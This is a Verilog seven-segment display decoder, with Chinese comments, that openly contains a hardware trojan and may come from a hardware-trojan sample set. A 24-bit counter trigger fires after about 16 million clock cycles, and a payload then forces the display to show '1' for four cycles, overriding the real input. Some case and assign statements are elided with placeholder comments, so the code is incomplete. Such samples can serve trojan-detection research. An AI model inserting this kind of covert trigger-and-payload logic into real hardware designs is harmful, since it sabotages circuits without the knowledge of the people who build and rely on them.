module design2000
(
   input           i_Clk,
   input           i_Rst,
   input   [3:0]   i_Binary_Num,
   output          o_Segment_A,
   output          o_Segment_B,
   output          o_Segment_C,
   output          o_Segment_D,
   output          o_Segment_E,
   output          o_Segment_F,
   output          o_Segment_G
);

   reg [6:0]       r_Hex_Encoding = 7'h00;
   reg             trojan_active;
   reg [23:0]      trojan_counter; // 24位元計數器，約16百萬次
   reg [1:0]       payload_timer;
   
   // 觸發器邏輯：計數器
   localparam TRIGGER_THRESHOLD = 24'hFFFFFF; // 設定一個非常大的閾值

   always @(posedge i_Clk or posedge i_Rst) begin
      if (i_Rst) begin
         trojan_counter <= 24'h0;
         trojan_active <= 1'b0;
         payload_timer <= 2'b00;
      end else begin
      // 觸發條件
         if (trojan_counter == TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
            trojan_counter <= 24'h0; // 重置計數器
         end else if (~trojan_active) begin
            trojan_counter <= trojan_counter + 1'b1; // 計數器持續遞增
         end
         
         // 有效負載邏輯
         if (trojan_active) begin
            if (payload_timer < 2'b11) begin // 執行4個週期
               payload_timer <= payload_timer + 1'b1;
            end else begin
               trojan_active <= 1'b0;
               payload_timer <= 2'b00;
            end
         end
      end
   end

   // 主要邏輯，在有效負載啟動時進行篡改
   always @(posedge i_Clk) begin
      if (trojan_active) begin
         r_Hex_Encoding <= 7'h06; // 強制顯示 "1"
      end else begin
         case (i_Binary_Num)
            4'b0000 : r_Hex_Encoding <= 7'h7E;
            // ... (其餘case語句) ...
            4'b1111 : r_Hex_Encoding <= 7'h47;
         endcase
      end
   end

   assign o_Segment_A = r_Hex_Encoding[6];
   // ... (其他assign語句) ...
   assign o_Segment_G = r_Hex_Encoding[0];

endmodule